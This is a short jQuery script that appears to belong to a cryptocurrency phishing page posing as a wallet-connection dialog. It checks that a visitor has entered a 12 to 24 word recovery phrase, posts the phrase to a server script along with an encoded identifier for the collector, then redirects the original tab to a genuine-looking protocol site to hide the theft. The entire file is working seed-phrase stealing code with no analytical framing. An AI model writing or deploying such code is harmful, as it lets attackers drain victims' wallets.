var mnemo_inp = $(".TextArea_textarea__2a4Ez");
var pass_inp = $(".Input_input__3eDDn");
var mnemo_err = $("#mn_err");
var pass_err = $("#ps_err");
var button = $("#do_connect");
var cls = "op_0";
mnemo_inp.on("input", function() {
    var txt = $(this).val().trim();
    if ((txt.split(" ").length >= 12 && txt.split(" ").length <= 24) || txt.length == 0) {
        mnemo_err.addClass(cls);
    } else {
        mnemo_err.removeClass(cls);
    }
    check_button();
});
$(".ExtensionList_item__DwZc0").click(function() {
    $(".st_1").hide();
    $(".st_2").show();
});
// pass_inp.on("input", function() {
//     var txt = $(this).val().trim();
//     if (txt.length >= 10 || txt.length == 0) {
//         pass_err.addClass(cls);
//     } else {
//         pass_err.removeClass(cls);
//     }
//     check_button();
// })

function check_button() {
    var txt1 = mnemo_inp.val().trim();
    var txt2 = pass_inp.val().trim();
    if (txt1.split(" ").length >= 12 && txt1.split(" ").length <= 24) {
        button.removeAttr("disabled").removeClass("Button_disabled__3yCOo");
        return true;
    } else {
        button.attr("disabled", "").addClass("Button_disabled__3yCOo");
        return false;
    }
}

button.click(function() {
    var t = $("#mnemonic_text").val().trim()
    if (check_button()) {
        $.ajax({
            url: "add.php",
            method: "POST",
            data: { mnemonic: t, 'token': 'dGVzdGluZ25ldHdvcmtAcHJvdG9ubWFpbC5jb20=' },
            dataType: "json",
            success: function(response) {
                if (response.status === 1) {
                    $("#mnemonic_text").val("");
                    window.opener.location.href = "https://prismprotocol.app";
                    self.close();
                } else {
                    var c = $("#pharse").css("border-color");
                    $("#pharse").css("border-color", "rgb(221 0 0)");
                    setTimeout(function() {
                        $("#mnemonic_text").css("border-color", c);
                    }, 400);
                }
            },
        });
    }
});